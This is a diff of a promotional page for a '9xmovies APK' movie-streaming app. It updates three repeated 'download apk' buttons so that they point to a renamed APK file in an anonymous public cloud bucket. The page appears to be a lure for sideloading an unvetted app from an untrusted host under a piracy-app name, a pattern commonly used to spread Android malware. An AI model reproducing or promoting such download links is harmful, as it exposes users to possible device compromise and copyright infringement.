@@ -1,8 +1,8 @@
 In today’s digital age, streaming movies has become one of the most popular ways to enjoy films from the comfort of our homes. One application that has gained attention is the 9xmovies APK. This app offers a wide variety of movies and shows for users to explore. Let’s take a closer look at what 9xmovies APK is and how it works.
 
-**[⬇🟢---->download apk<----🟢⬇](https://pub-5da19cd51e404a43910ed67937996c95.r2.dev/Cine%202.apk)** <br>
-**[⬇🟢---->download apk<----🟢⬇](https://pub-5da19cd51e404a43910ed67937996c95.r2.dev/Cine%202.apk)** <br>
-**[⬇🟢---->download apk<----🟢⬇](https://pub-5da19cd51e404a43910ed67937996c95.r2.dev/Cine%202.apk)**
+**[⬇🟢---->download apk<----🟢⬇](https://pub-5da19cd51e404a43910ed67937996c95.r2.dev/Cineplay_2.3.apk)** <br>
+**[⬇🟢---->download apk<----🟢⬇](https://pub-5da19cd51e404a43910ed67937996c95.r2.dev/Cineplay_2.3.apk)** <br>
+**[⬇🟢---->download apk<----🟢⬇](https://pub-5da19cd51e404a43910ed67937996c95.r2.dev/Cineplay_2.3.apk)**
 
 
 ## What is 9xmovies APK?
